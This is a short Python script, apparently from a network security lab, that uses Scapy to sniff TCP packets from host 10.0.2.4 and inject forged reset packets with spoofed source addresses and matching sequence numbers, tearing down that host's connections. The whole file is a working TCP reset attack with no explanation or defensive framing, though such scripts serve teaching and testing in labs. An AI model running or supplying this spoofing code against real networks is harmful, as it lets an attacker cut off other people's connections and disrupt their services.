#!/usr/bin/python

from scapy.all import *

def spoofTCP(pkt):
	ip = IP(src=pkt[IP].dst, dst="10.0.2.4")
	tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="R", seq=pkt[TCP].ack)
	pkt = ip/tcp
	send(pkt)

sniff(filter="tcp and src host 10.0.2.4", prn=spoofTCP)
